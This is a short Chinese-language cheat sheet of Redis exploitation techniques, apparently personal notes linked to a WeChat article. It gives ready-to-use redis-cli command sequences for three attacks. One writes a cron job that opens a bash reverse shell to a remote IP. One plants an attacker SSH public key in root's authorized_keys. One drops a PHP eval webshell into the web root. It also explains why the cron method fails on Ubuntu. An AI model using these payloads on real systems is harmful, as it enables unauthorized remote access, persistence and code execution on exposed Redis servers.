# [Redis常见利用方法](https://mp.weixin.qq.com/s/qQkiGO5wPs8no_BoK13tig)
## 反弹shell只能在Centos上使用，Ubuntu上是行不通的，原因如下:
## 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/<username>权限必须是600也就是-rw———-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，
## 而Centos的定时任务文件/var/spool/cron/<username>权限644也能执行

# 失败了 redis-cli.exe -h xx -p 63300
.\redis-cli.exe -h 192.168.127.131
config set dir /var/spool/cron/crontabs
set -.- "\n\n\nbash -c 'bash -i >& /dev/tcp/192.168.50.161/5555 0>&1'\n\n\n"
config set dbfilename root
save






# 2. root身份 可写入 ssh
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x " AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx"
save

# 2.2 写入 ssh
redis > FLUSHALL
sh$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
sh$ cat key.txt | redis-cli -h 172.16.186.4 -x set crackit
config set dir /root/.ssh/
config set dbfilename authorized_keys


# 3. 写webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save

